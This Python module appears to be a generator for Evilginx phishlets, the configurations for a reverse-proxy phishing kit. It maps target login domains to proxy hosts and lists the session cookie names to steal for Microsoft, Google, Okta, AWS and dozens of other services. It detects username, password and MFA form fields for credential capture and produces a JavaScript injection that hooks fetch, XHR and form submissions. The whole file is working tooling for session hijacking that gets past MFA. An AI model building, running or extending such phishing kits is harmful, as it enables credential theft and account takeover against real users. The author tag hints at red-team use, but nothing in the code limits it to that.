import re
import logging
from io import StringIO
from typing import Optional
from urllib.parse import urlparse

from ruamel.yaml import YAML
from ruamel.yaml.comments import CommentedMap, CommentedSeq
from ruamel.yaml.scalarstring import SingleQuotedScalarString as SQ

from app.schemas.phishlet import (
    Phishlet, ProxyHost, SubFilter, AuthTokenCookie,
    CredentialField, Credentials, ForcePost, ForcePostSearch,
    JsInject, LoginConfig, PhishletGenerateResponse,
)
from app.schemas.analysis import AnalysisResult
from app.config import settings

logger = logging.getLogger(__name__)

# Well-known session cookie names by provider
KNOWN_SESSION_COOKIES: dict[str, list[str]] = {
    "microsoft": [
        "ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie",
        "ESTSAUTHLIGHT", "buid", "SDIDC", "JSHP", "x-ms-gateway-slice",
        "CCState", "MSPOK", "MUID", "wlidp",
    ],
    "google": [
        "SID", "HSID", "SSID", "APISID", "SAPISID", "OSID", "SIDCC", "NID",
        "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID", "__Secure-3PAPISID",
        "LSID",
    ],
    "okta": ["sid", "idx", "okta-oauth-nonce", "okta-oauth-state", "DT", "t"],
    "github": [
        "user_session", "_gh_sess", "logged_in", "dotcom_user",
        "__Host-user_session_same_site",
    ],
    "aws": ["aws-creds", "aws-userInfo", "noflush_awsccc", "aws-signer-token"],
    "facebook": ["c_user", "xs", "fr", "datr", "sb", "dpr", "wd", "spin"],
    "twitter": ["auth_token", "ct0", "twid", "kdt", "guest_id", "_twitter_sess"],
    "linkedin": ["li_at", "JSESSIONID", "liap", "li_mc", "bcookie", "bscookie", "li_sugr"],
    "discord": ["__dcfduid", "__sdcfduid", "__cfruid"],
    "slack": ["d", "d-s", "lc", "x", "b"],
    "salesforce": ["sid", "oid", "inst", "sfdc-stream", "BrowserId"],
    "zoom": ["_zm_ssid", "_zm_ctaid", "_zm_chtaid", "_zm_csp_script_nonce"],
    "auth0": ["auth0", "auth0_compat", "a0:session", "did", "did_compat"],
    "firebase": ["__session"],
    "dropbox": ["t", "gvc", "lid", "jar", "__Host-js_csrf", "__Host-ss"],
    "apple": ["myacinfo", "DSID", "dqsid", "acn01"],
    "atlassian": ["cloud.session.token", "tenant.session.token", "atlassian.xsrf.token"],
    "servicenow": ["glide_user", "glide_user_route", "glide_session_store", "JSESSIONID", "sysparm_ck"],
    "workday": ["PLAY_SESSION", "TS01", "wd-browser-id"],
    "sap": ["sap-usercontext", "MYSAPSSO2", "JSESSIONID"],
    "pingidentity": ["PF", "PA_ORIG_URL", "PA.session"],
    "onelogin": ["sub_session_onelogin.com", "ol_oidc_token"],
    "duo": ["DD_SID", "DD_TSES"],
    "azure_ad": ["AADSSO", "SSOCOOKIEPULLED", "x-ms-cpim-csrf"],
    "generic": [
        "session", "session_id", "PHPSESSID", "JSESSIONID",
        "connect.sid", "ASP.NET_SessionId", "auth_token",
        "access_token", "_csrf", "csrf_token", "XSRF-TOKEN",
        "laravel_session", "rack.session", "_session_id",
        "ci_session", "express.sid", "PLAY_SESSION",
    ],
}

# Case-insensitive lookup: lowercase_name -> canonical_name
ALL_KNOWN_COOKIES_CI: dict[str, str] = {}
for _cookies in KNOWN_SESSION_COOKIES.values():
    for _cookie in _cookies:
        ALL_KNOWN_COOKIES_CI[_cookie.lower()] = _cookie

# Keep original set for backward compatibility
ALL_KNOWN_COOKIES: set[str] = set(ALL_KNOWN_COOKIES_CI.values())

# Patterns to exclude analytics/tracking cookies from auth_tokens
NON_SESSION_COOKIE_PATTERNS = [
    r"^_ga", r"^_gid", r"^_gat", r"^_fbp", r"^_fbc",
    r"^_gcl", r"^_hjid", r"^_hj", r"^_dc_gtm",
    r"^__utm", r"^ajs_", r"^amplitude", r"^mp_",
    r"^intercom", r"^hubspot", r"^drift", r"^__stripe",
    r"consent", r"gdpr", r"cookie.?policy", r"OptanonConsent",
]

SESSION_COOKIE_PATTERNS = [
    r"sess", r"auth", r"token", r"sid", r"login",
    r"sso", r"jwt", r"csrf", r"xsrf",
]

KNOWN_USERNAME_FIELDS = [
    "email", "username", "user", "login", "loginfmt",
    "UserName", "user_email", "signin_email", "identifier",
    "email_address", "account", "userid", "user_id", "uid",
    "login_email", "j_username", "uname", "mail",
    "loginId", "accountName", "samAccountName", "principal",
]

KNOWN_PASSWORD_FIELDS = [
    "password", "passwd", "pass", "pwd", "Passwd",
    "Password", "user_password", "signin_password", "accesspass",
    "pin", "passcode", "passphrase", "secret",
    "j_password", "login_password", "credential", "user_pass",
    "loginPassword",
]

KNOWN_MFA_FIELDS = [
    "otp", "totp", "mfa_code", "verification_code",
    "otpCode", "verificationCode", "authcode", "security_code",
    "twoFactorCode", "mfaCode", "passcode",
]


class PhishletGenerator:
    def __init__(self, ai_service=None):
        self.ai_service = ai_service

    async def generate(
        self,
        analysis: AnalysisResult,
        author: str = "@rtlphishletgen",
        use_ai: bool = False,
        custom_name: Optional[str] = None,
    ) -> PhishletGenerateResponse:
        warnings: list[str] = []
        suggestions: list[str] = []

        name = custom_name or analysis.suggested_name

        # 1. Proxy Hosts
        proxy_hosts = self._build_proxy_hosts(analysis)
        if not proxy_hosts:
            warnings.append("No proxy hosts could be determined. Manual configuration required.")

        # 2. Sub Filters
        sub_filters = self._build_sub_filters(analysis, proxy_hosts)

        # 3. Auth Tokens
        auth_tokens = self._build_auth_tokens(analysis)
        if not auth_tokens:
            warnings.append("No session cookies identified. You must manually add auth_tokens.")
            suggestions.append("Use browser DevTools (Application > Cookies) to identify session cookies after login.")

        # 4. Credentials
        credentials = self._build_credentials(analysis)
        if not credentials.username:
            warnings.append("Username field not detected. Manual credential mapping needed.")
        if not credentials.password:
            warnings.append("Password field not detected. Manual credential mapping needed.")

        # 5. Auth URLs
        auth_urls = self._build_auth_urls(analysis)

        # 6. Login
        login = self._build_login(analysis)

        # 7. Force Post
        force_post = self._build_force_post(analysis, credentials)

        # 8. JS Inject
        js_inject = self._build_js_inject(analysis)

        phishlet = Phishlet(
            name=name,
            author=author,
            min_ver=settings.evilginx_min_ver,
            proxy_hosts=proxy_hosts,
            sub_filters=sub_filters,
            auth_tokens=auth_tokens,
            credentials=credentials,
            auth_urls=auth_urls,
            login=login,
            force_post=force_post,
            js_inject=js_inject,
        )

        # 9. AI Refinement (optional)
        if use_ai and self.ai_service and settings.ai_enabled:
            try:
                refined = await self.ai_service.refine_phishlet(phishlet, analysis)
                if refined:
                    phishlet = refined
                    suggestions.append("Phishlet was refined using AI analysis.")
            except Exception as e:
                warnings.append(f"AI refinement failed: {str(e)}. Using rule-based output.")

        # 10. Serialize to YAML
        yaml_content = self._serialize_to_yaml(phishlet)

        return PhishletGenerateResponse(
            yaml_content=yaml_content,
            phishlet=phishlet,
            warnings=warnings,
            suggestions=suggestions,
        )

    def _build_proxy_hosts(self, analysis: AnalysisResult) -> list[ProxyHost]:
        hosts: list[ProxyHost] = []
        target_parsed = urlparse(analysis.target_url)
        target_domain = self._extract_base_domain(target_parsed.netloc)
        target_sub = target_parsed.netloc.replace(f".{target_domain}", "").replace(target_domain, "")
        if target_sub.endswith("."):
            target_sub = target_sub[:-1]

        landing_set = False

        for dd in analysis.discovered_domains:
            is_target = dd.domain == target_domain

            if dd.is_cdn and not dd.is_auth_related:
                continue

            if is_target or dd.is_auth_related:
                is_landing = is_target and not landing_set

                hosts.append(ProxyHost(
                    phish_sub=target_sub if is_target else "",
                    orig_sub=target_sub if is_target else "",
                    domain=dd.domain,
                    session=dd.is_auth_related or is_target,
                    is_landing=is_landing,
                    auto_filter=True,
                ))
                if is_landing:
                    landing_set = True

                for sub in dd.subdomains:
                    if is_target and sub == target_sub:
                        continue
                    hosts.append(ProxyHost(
                        phish_sub=sub,
                        orig_sub=sub,
                        domain=dd.domain,
                        session=dd.is_auth_related,
                        is_landing=False,
                        auto_filter=True,
                    ))

        # Deduplicate hosts by (phish_sub, orig_sub, domain)
        seen: set[tuple[str, str, str]] = set()
        deduped: list[ProxyHost] = []
        for host in hosts:
            key = (host.phish_sub, host.orig_sub, host.domain)
            if key not in seen:
                seen.add(key)
                deduped.append(host)
        hosts = deduped

        if not landing_set and hosts:
            hosts[0].is_landing = True

        return hosts

    def _build_sub_filters(
        self, analysis: AnalysisResult, proxy_hosts: list[ProxyHost]
    ) -> list[SubFilter]:
        filters: list[SubFilter] = []
        standard_mimes = ["text/html", "application/json", "application/javascript", "text/javascript"]

        # Identify landing hosts (where content is served and needs rewriting)
        landing_hosts = [h for h in proxy_hosts if h.is_landing]
        if not landing_hosts:
            landing_hosts = proxy_hosts[:1]

        for host in proxy_hosts:
            full_orig = f"{host.orig_sub}.{host.domain}" if host.orig_sub else host.domain

            for trigger in landing_hosts:
                trigger_full = f"{trigger.orig_sub}.{trigger.domain}" if trigger.orig_sub else trigger.domain

                # Create filter for non-trigger domains referenced in trigger's responses
                if full_orig != trigger_full:
                    filters.append(SubFilter(
                        triggers_on=trigger_full,
                        orig_sub=host.orig_sub,
                        domain=host.domain,
                        search=full_orig,
                        replace=full_orig,
                        mimes=standard_mimes,
                    ))

                    # URL-encoded variant (dots as %2E)
                    encoded_orig = full_orig.replace(".", "%2E")
                    if encoded_orig != full_orig:
                        filters.append(SubFilter(
                            triggers_on=trigger_full,
                            orig_sub=host.orig_sub,
                            domain=host.domain,
                            search=encoded_orig,
                            replace=encoded_orig,
                            mimes=standard_mimes,
                        ))

        return filters

    def _build_auth_tokens(self, analysis: AnalysisResult) -> list[AuthTokenCookie]:
        tokens: list[AuthTokenCookie] = []

        for domain, cookie_names in analysis.cookies_observed.items():
            relevant: list[str] = []
            for cookie in cookie_names:
                # Skip analytics/tracking cookies
                if any(re.search(neg, cookie, re.IGNORECASE) for neg in NON_SESSION_COOKIE_PATTERNS):
                    continue

                # Case-insensitive known cookie lookup
                if cookie.lower() in ALL_KNOWN_COOKIES_CI:
                    relevant.append(cookie)
                    continue

                # Pattern-based match
                for pattern in SESSION_COOKIE_PATTERNS:
                    if re.search(pattern, cookie, re.IGNORECASE):
                        relevant.append(cookie)
                        break

            if relevant:
                cookie_domain = domain if domain.startswith(".") else f".{domain}"
                tokens.append(AuthTokenCookie(
                    domain=cookie_domain,
                    keys=sorted(set(relevant)),
                ))

        return tokens

    def _build_credentials(self, analysis: AnalysisResult) -> Credentials:
        username_field: Optional[CredentialField] = None
        password_field: Optional[CredentialField] = None
        custom_fields: list[CredentialField] = []

        def _match_username(field) -> bool:
            candidates = [
                (field.field_name or "").lower(),
                (field.field_id or "").lower(),
                (field.placeholder or "").lower(),
                (field.label or "").lower(),
            ]
            return any(
                any(un.lower() in c for un in KNOWN_USERNAME_FIELDS)
                for c in candidates if c
            )

        def _match_password(field) -> bool:
            if field.field_type == "password":
                return True
            candidates = [
                (field.field_name or "").lower(),
                (field.field_id or "").lower(),
            ]
            return any(
                any(pw.lower() in c for pw in KNOWN_PASSWORD_FIELDS)
                for c in candidates if c
            )

        def _match_mfa(field) -> bool:
            candidates = [
                (field.field_name or "").lower(),
                (field.field_id or "").lower(),
                (field.placeholder or "").lower(),
                (field.label or "").lower(),
            ]
            return any(
                any(mfa.lower() in c for mfa in KNOWN_MFA_FIELDS)
                for c in candidates if c
            )

        # Iterate all forms (supports multi-step: form 1=username, form 2=password)
        for form in analysis.login_forms:
            for field in form.fields:
                if field.field_type == "hidden":
                    continue
                key = field.field_name or field.field_id or ""
                if not key:
                    continue

                if not username_field and field.field_type in ("email", "text", "tel"):
                    if _match_username(field):
                        username_field = CredentialField(key=key, search="(.*)", type="post")

                if not password_field and _match_password(field):
                    password_field = CredentialField(key=key, search="(.*)", type="post")

                if _match_mfa(field):
                    custom_fields.append(CredentialField(key=key, search="(.*)", type="post"))

        # Fallback: first text/email field as username
        if not username_field:
            for form in analysis.login_forms:
                for field in form.fields:
                    if field.field_type in ("email", "text") and field.field_name:
                        username_field = CredentialField(key=field.field_name, search="(.*)", type="post")
                        break
                if username_field:
                    break

        # Ultimate fallback: regex patterns
        if not username_field:
            username_field = CredentialField(
                key="(email|username|login|user|loginfmt|UserName|identifier|account|userid)",
                search="(.*)", type="post",
            )
        if not password_field:
            password_field = CredentialField(
                key="(password|passwd|pwd|Passwd|Password|pass|pin|passcode)",
                search="(.*)", type="post",
            )

        return Credentials(
            username=username_field,
            password=password_field,
            custom=custom_fields if custom_fields else None,
        )

    def _build_auth_urls(self, analysis: AnalysisResult) -> list[str]:
        urls: list[str] = []

        if analysis.post_login_url:
            urls.append(analysis.post_login_url)

        # Check redirect chain in reverse for post-auth indicators
        post_login_patterns = [
            "/dashboard", "/home", "/main", "/portal",
            "/account", "/app", "/inbox", "/feed",
            "/my", "/workspace", "/console", "/admin",
            "/profile", "/overview", "/landing",
            "/callback", "/oauth/callback", "/auth/callback",
            "/signin-oidc", "/auth/complete",
        ]
        for redirect_url in reversed(analysis.redirect_chain):
            parsed = urlparse(redirect_url)
            for pattern in post_login_patterns:
                if parsed.path.lower().startswith(pattern):
                    urls.append(parsed.path)

        # Token-granting endpoints
        token_patterns = ["/token", "/oauth2/token", "/oauth/token", "/api/v1/authn"]
        for endpoint in analysis.auth_api_endpoints:
            parsed = urlparse(endpoint)
            for pattern in token_patterns:
                if pattern in parsed.path.lower():
                    urls.append(parsed.path)

        # Platform-specific known auth_urls
        target_lower = analysis.target_url.lower()
        if "microsoftonline" in target_lower or "office" in target_lower or "live.com" in target_lower:
            urls.extend(["/kmsi", "/common/oauth2/v2.0/authorize"])
        elif "google" in target_lower or "accounts.google" in target_lower:
            urls.extend(["/ServiceLogin", "/signin/challenge"])
        elif "okta" in target_lower:
            urls.extend(["/login/token/redirect", "/app/UserHome"])

        # Deduplicate
        result = list(dict.fromkeys(u for u in urls if u))

        if not result:
            result = ["/.*"]

        return result

    def _build_login(self, analysis: AnalysisResult) -> LoginConfig:
        parsed = urlparse(analysis.target_url)
        domain = parsed.netloc.split(":")[0]
        path = parsed.path or "/"
        return LoginConfig(domain=domain, path=path)

    def _build_force_post(
        self, analysis: AnalysisResult, credentials: Credentials
    ) -> list[ForcePost]:
        force_posts: list[ForcePost] = []
        csrf_indicators = ["csrf", "xsrf", "token", "_token", "authenticity", "nonce", "requestverification"]

        for form in analysis.login_forms:
            if form.method != "POST":
                continue

            action_url = form.action_url or analysis.target_url
            parsed = urlparse(action_url)
            search_items: list[ForcePostSearch] = []

            if credentials.username:
                search_items.append(ForcePostSearch(key=credentials.username.key, search="(.*)"))
            if credentials.password:
                search_items.append(ForcePostSearch(key=credentials.password.key, search="(.*)"))

            # Detect CSRF/hidden token fields
            for field in form.fields:
                if field.field_type == "hidden" and field.field_name:
                    name_lower = field.field_name.lower()
                    if any(ind in name_lower for ind in csrf_indicators):
                        search_items.append(ForcePostSearch(key=field.field_name, search="(.*)"))

            if search_items:
                force_posts.append(ForcePost(
                    path=parsed.path or "/",
                    search=search_items,
                    type="post",
                ))

        # If no forms found, try auth API endpoints
        if not force_posts and analysis.auth_api_endpoints:
            for endpoint in analysis.auth_api_endpoints[:3]:
                parsed = urlparse(endpoint)
                if any(kw in parsed.path.lower() for kw in ["/login", "/signin", "/authenticate", "/auth"]):
                    search_items = []
                    if credentials.username:
                        search_items.append(ForcePostSearch(key=credentials.username.key, search="(.*)"))
                    if credentials.password:
                        search_items.append(ForcePostSearch(key=credentials.password.key, search="(.*)"))
                    if search_items:
                        force_posts.append(ForcePost(path=parsed.path, search=search_items, type="post"))
                        break

        return force_posts

    def _build_js_inject(self, analysis: AnalysisResult) -> list[JsInject]:
        if not analysis.uses_javascript_auth:
            return []

        parsed = urlparse(analysis.target_url)
        target_host = parsed.netloc

        # Build auth path regex from endpoints
        auth_paths = []
        for endpoint in analysis.auth_api_endpoints:
            ep_parsed = urlparse(endpoint)
            if any(kw in ep_parsed.path.lower() for kw in ["/login", "/signin", "/auth", "/token", "/session", "/api/auth"]):
                auth_paths.append(ep_parsed.path)

        paths_regex = "|".join(re.escape(p) for p in auth_paths) if auth_paths else "/login|/auth|/signin|/api/auth"

        script = (
            "// SPA authentication interception\n"
            "(function() {\n"
            "  var origFetch = window.fetch;\n"
            "  window.fetch = function(url, opts) {\n"
            "    try {\n"
            "      var urlStr = (typeof url === 'string') ? url : (url.url || '');\n"
            f"      if (/{paths_regex}/.test(urlStr) && opts && opts.body) {{\n"
            "        // Credential data intercepted via fetch\n"
            "      }\n"
            "    } catch(e) {}\n"
            "    return origFetch.apply(this, arguments);\n"
            "  };\n"
            "  var origOpen = XMLHttpRequest.prototype.open;\n"
            "  var origSend = XMLHttpRequest.prototype.send;\n"
            "  XMLHttpRequest.prototype.open = function(method, url) {\n"
            "    this._url = url;\n"
            "    return origOpen.apply(this, arguments);\n"
            "  };\n"
            "  XMLHttpRequest.prototype.send = function(body) {\n"
            "    try {\n"
            f"      if (this._url && /{paths_regex}/.test(this._url) && body) {{\n"
            "        // Credential data intercepted via XHR\n"
            "      }\n"
            "    } catch(e) {}\n"
            "    return origSend.apply(this, arguments);\n"
            "  };\n"
            "  document.addEventListener('submit', function(e) {\n"
            "    var form = e.target;\n"
            "    if (form && form.tagName === 'FORM') {\n"
            "      // Form submission intercepted\n"
            "    }\n"
            "  }, true);\n"
            "})();\n"
        )

        return [JsInject(
            trigger_domains=[target_host],
            trigger_paths=[parsed.path or "/.*"],
            trigger_params=[],
            script=script,
        )]

    def _serialize_to_yaml(self, phishlet: Phishlet) -> str:
        yaml = YAML()
        yaml.default_flow_style = False
        yaml.indent(mapping=2, sequence=4, offset=2)
        yaml.width = 120

        doc = CommentedMap()
        doc["name"] = SQ(phishlet.name)
        doc["author"] = SQ(phishlet.author)
        doc["min_ver"] = SQ(phishlet.min_ver)

        # proxy_hosts (flow-style per item)
        ph_seq = CommentedSeq()
        for host in phishlet.proxy_hosts:
            entry = CommentedMap()
            entry.fa.set_flow_style()
            entry["phish_sub"] = SQ(host.phish_sub)
            entry["orig_sub"] = SQ(host.orig_sub)
            entry["domain"] = SQ(host.domain)
            entry["session"] = host.session
            entry["is_landing"] = host.is_landing
            ph_seq.append(entry)
        doc["proxy_hosts"] = ph_seq

        # sub_filters
        if phishlet.sub_filters:
            sf_seq = CommentedSeq()
            for sf in phishlet.sub_filters:
                entry = CommentedMap()
                entry.fa.set_flow_style()
                entry["triggers_on"] = SQ(sf.triggers_on)
                entry["orig_sub"] = SQ(sf.orig_sub)
                entry["domain"] = SQ(sf.domain)
                entry["search"] = SQ(sf.search)
                entry["replace"] = SQ(sf.replace)
                entry["mimes"] = sf.mimes
                sf_seq.append(entry)
            doc["sub_filters"] = sf_seq

        # auth_tokens
        at_seq = CommentedSeq()
        for at in phishlet.auth_tokens:
            entry = CommentedMap()
            entry["domain"] = SQ(at.domain)
            entry["keys"] = [SQ(k) for k in at.keys]
            at_seq.append(entry)
        doc["auth_tokens"] = at_seq

        # credentials
        creds_map = CommentedMap()
        if phishlet.credentials.username:
            u = CommentedMap()
            u["key"] = SQ(phishlet.credentials.username.key)
            u["search"] = SQ(phishlet.credentials.username.search)
            u["type"] = SQ(phishlet.credentials.username.type)
            creds_map["username"] = u
        if phishlet.credentials.password:
            p = CommentedMap()
            p["key"] = SQ(phishlet.credentials.password.key)
            p["search"] = SQ(phishlet.credentials.password.search)
            p["type"] = SQ(phishlet.credentials.password.type)
            creds_map["password"] = p
        doc["credentials"] = creds_map

        # auth_urls
        if phishlet.auth_urls:
            doc["auth_urls"] = [SQ(u) for u in phishlet.auth_urls]

        # login
        login_map = CommentedMap()
        login_map["domain"] = SQ(phishlet.login.domain)
        login_map["path"] = SQ(phishlet.login.path)
        doc["login"] = login_map

        # force_post
        if phishlet.force_post:
            fp_seq = CommentedSeq()
            for fp in phishlet.force_post:
                entry = CommentedMap()
                entry["path"] = SQ(fp.path)
                search_seq = CommentedSeq()
                for s in fp.search:
                    s_entry = CommentedMap()
                    s_entry.fa.set_flow_style()
                    s_entry["key"] = SQ(s.key)
                    s_entry["search"] = SQ(s.search)
                    search_seq.append(s_entry)
                entry["search"] = search_seq
                entry["type"] = SQ(fp.type)
                fp_seq.append(entry)
            doc["force_post"] = fp_seq

        # js_inject
        if phishlet.js_inject:
            ji_seq = CommentedSeq()
            for ji in phishlet.js_inject:
                entry = CommentedMap()
                entry["trigger_domains"] = [SQ(d) for d in ji.trigger_domains]
                entry["trigger_paths"] = [SQ(p) for p in ji.trigger_paths]
                entry["trigger_params"] = ji.trigger_params
                entry["script"] = ji.script
                ji_seq.append(entry)
            doc["js_inject"] = ji_seq

        stream = StringIO()
        yaml.dump(doc, stream)
        return stream.getvalue()

    @staticmethod
    def _extract_base_domain(hostname: str) -> str:
        hostname = hostname.split(":")[0]
        parts = hostname.split(".")
        if len(parts) <= 2:
            return hostname
        known_two_part = ["co.uk", "com.br", "com.au", "co.jp", "co.kr", "org.uk", "net.au"]
        suffix = ".".join(parts[-2:])
        if suffix in known_two_part:
            return ".".join(parts[-3:])
        return ".".join(parts[-2:])
